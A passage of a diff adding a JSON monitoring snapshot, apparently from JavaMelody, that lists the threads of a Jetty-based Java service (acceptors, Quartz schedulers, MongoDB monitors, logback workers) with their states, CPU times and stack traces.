+        "cpuTimeMillis": 85496,
+        "userTimeMillis": 34880,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_64",
+        "stackTrace": [
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:234)",
+          "org.eclipse.jetty.server.ServerConnector.accept(ServerConnector.java:352)",
+          "org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:603)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102008",
+        "id": 102008,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 6634,
+        "userTimeMillis": 6050,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102008",
+        "stackTrace": [
+          "sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)",
+          "sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)",
+          "sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)",
+          "sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.select(ManagedSelector.java:234)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.produce(ManagedSelector.java:187)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:211)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:199)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_QuartzSchedulerThread",
+        "id": 53,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 8462,
+        "userTimeMillis": 6750,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_53",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.core.QuartzSchedulerThread.run(QuartzSchedulerThread.java:437)"
+        ]
+      },
+      {
+        "name": "dw-admin-63-acceptor-0@72fa36f2-admin@3868468e{HTTP/1.1,[http/1.1]}{0.0.0.0:8082}",
+        "id": 63,
+        "priority": 3,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_63",
+        "stackTrace": [
+          "sun.nio.ch.ServerSocketChannelImpl.accept0(Native Method)",
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:422)",
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:250)",
+          "org.eclipse.jetty.server.ServerConnector.accept(ServerConnector.java:352)",
+          "org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:603)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102034",
+        "id": 102034,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 868,
+        "userTimeMillis": 780,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102034",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:392)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.idleJobPoll(QueuedThreadPool.java:565)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.access$800(QueuedThreadPool.java:50)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:628)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102031",
+        "id": 102031,
+        "priority": 5,
+        "daemon": false,
+        "state": "WAITING",
+        "cpuTimeMillis": 1543,
+        "userTimeMillis": 1390,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102031",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:173)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-38-acceptor-0@2e080686-application@368022b9{HTTP/1.1,[http/1.1]}{0.0.0.0:9092}",
+        "id": 38,
+        "priority": 3,
+        "daemon": false,
+        "state": "BLOCKED",
+        "cpuTimeMillis": 1788521,
+        "userTimeMillis": 752630,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_38",
+        "stackTrace": [
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:233)",
+          "org.eclipse.jetty.server.ServerConnector.accept(ServerConnector.java:352)",
+          "org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:603)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-admin-55",
+        "id": 55,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_55",
+        "stackTrace": [
+          "sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)",
+          "sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)",
+          "sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)",
+          "sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.select(ManagedSelector.java:234)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.produce(ManagedSelector.java:187)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:211)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:126)",
+          "org.eclipse.jetty.io.ManagedSelector$$Lambda$80/1693233620.run(Unknown Source)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "Timer-0",
+        "id": 54,
+        "priority": 5,
+        "daemon": true,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 21,
+        "userTimeMillis": 10,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_54",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "java.util.TimerThread.mainLoop(Timer.java:552)",
+          "java.util.TimerThread.run(Timer.java:505)"
+        ]
+      },
+      {
+        "name": "Signal Dispatcher",
+        "id": 4,
+        "priority": 9,
+        "daemon": true,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_4",
+        "stackTrace": []
+      },
+      {
+        "name": "logback-1",
+        "id": 2128,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 1183,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_2128",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1081)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "DestroyJavaVM",
+        "id": 61,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 2312086,
+        "userTimeMillis": 2062540,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_61",
+        "stackTrace": []
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-5",
+        "id": 47,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 214724,
+        "userTimeMillis": 116310,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_47",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "cluster-ClusterId{value='5afcc10f361bcef665058f86', description='null'}-10.140.78.19:27020",
+        "id": 31,
+        "priority": 5,
+        "daemon": true,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 111262,
+        "userTimeMillis": 88540,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_31",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.waitForSignalOrTimeout(DefaultServerMonitor.java:238)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.waitForNext(DefaultServerMonitor.java:219)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.run(DefaultServerMonitor.java:168)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-41-acceptor-3@53f761d9-application@368022b9{HTTP/1.1,[http/1.1]}{0.0.0.0:9092}",
+        "id": 41,
+        "priority": 3,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 1787120,
+        "userTimeMillis": 757270,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_41",
+        "stackTrace": [
+          "sun.nio.ch.ServerSocketChannelImpl.accept0(Native Method)",
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:422)",
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:250)",
+          "org.eclipse.jetty.server.ServerConnector.accept(ServerConnector.java:352)",
+          "org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:603)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-admin-58",
+        "id": 58,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_58",
+        "stackTrace": [
+          "sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)",
+          "sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)",
+          "sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)",
+          "sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.select(ManagedSelector.java:234)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.produce(ManagedSelector.java:187)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:211)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:126)",
+          "org.eclipse.jetty.io.ManagedSelector$$Lambda$80/1693233620.run(Unknown Source)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "logback-5",
+        "id": 7897,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 958,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_7897",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1081)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "AsyncAppender-Worker-async-file-appender",
+        "id": 33,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 9073375,
+        "userTimeMillis": 5241650,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_33",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:403)",
+          "ch.qos.logback.core.AsyncAppenderBase$Worker.run(AsyncAppenderBase.java:264)"
+        ]
+      },
+      {
+        "name": "dw-101993",
+        "id": 101993,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 9620,
+        "userTimeMillis": 8740,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_101993",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:392)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.idleJobPoll(QueuedThreadPool.java:565)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.access$800(QueuedThreadPool.java:50)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:628)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "cluster-ClusterId{value='5afcc10f361bcef665058f86', description='null'}-nvmbd2afu130d00:27020",
+        "id": 32,
+        "priority": 5,
+        "daemon": true,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 109864,
+        "userTimeMillis": 87660,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_32",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.waitForSignalOrTimeout(DefaultServerMonitor.java:238)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.waitForNext(DefaultServerMonitor.java:219)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.run(DefaultServerMonitor.java:168)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "Reference Handler",
+        "id": 2,
+        "priority": 10,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 1498,
+        "userTimeMillis": 1150,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_2",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "java.lang.Object.wait(Object.java:502)",
+          "java.lang.ref.Reference.tryHandlePending(Reference.java:191)",
+          "java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)"
+        ]
+      },
+      {
+        "name": "pool-2-thread-1",
+        "id": 30,
+        "priority": 5,
+        "daemon": true,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 125062,
+        "userTimeMillis": 80840,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_30",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "logback-2",
+        "id": 2129,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 1410,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_2129",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1081)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "javamelody",
+        "id": 56,
+        "priority": 5,
+        "daemon": true,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 4249712,
+        "userTimeMillis": 3870730,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_56",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "java.util.TimerThread.mainLoop(Timer.java:552)",
+          "java.util.TimerThread.run(Timer.java:505)"
+        ]
+      },
+      {
+        "name": "dw-admin-65-acceptor-2@573051a4-admin@3868468e{HTTP/1.1,[http/1.1]}{0.0.0.0:8082}",
+        "id": 65,
+        "priority": 3,
+        "daemon": false,
+        "state": "BLOCKED",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_65",
+        "stackTrace": [
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:234)",
+          "org.eclipse.jetty.server.ServerConnector.accept(ServerConnector.java:352)",
+          "org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:603)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-39-acceptor-1@7a6bcbc5-application@368022b9{HTTP/1.1,[http/1.1]}{0.0.0.0:9092}",
+        "id": 39,
+        "priority": 3,
+        "daemon": false,
+        "state": "BLOCKED",
+        "cpuTimeMillis": 1776086,
+        "userTimeMillis": 749750,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_39",
+        "stackTrace": [
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:233)",
+          "org.eclipse.jetty.server.ServerConnector.accept(ServerConnector.java:352)",
+          "org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:603)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "Scheduler-95216785",
+        "id": 85,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 10108402,
+        "userTimeMillis": 6008820,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_85",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "cluster-ClusterId{value='5afcc10f361bcef665058f86', description='null'}-10.140.78.175:27020",
+        "id": 29,
+        "priority": 5,
+        "daemon": true,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 114819,
+        "userTimeMillis": 92890,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_29",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.waitForSignalOrTimeout(DefaultServerMonitor.java:238)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.waitForNext(DefaultServerMonitor.java:219)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.run(DefaultServerMonitor.java:168)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102028",
+        "id": 102028,
+        "priority": 5,
+        "daemon": false,
+        "state": "WAITING",
+        "cpuTimeMillis": 2159,
+        "userTimeMillis": 1960,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102028",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:173)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "Tomcat JDBC Pool Cleaner[1118140819:1526513915526]",
+        "id": 26,
+        "priority": 5,
+        "daemon": true,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 235403,
+        "userTimeMillis": 158850,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_26",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "java.util.TimerThread.mainLoop(Timer.java:552)",
+          "java.util.TimerThread.run(Timer.java:505)"
+        ]
+      }
+    ],
+    "cacheInformationsList": [],
+    "jobInformationsList": [],
+    "webXmlExists": false,
+    "pomXmlExists": false
+  }
+]}
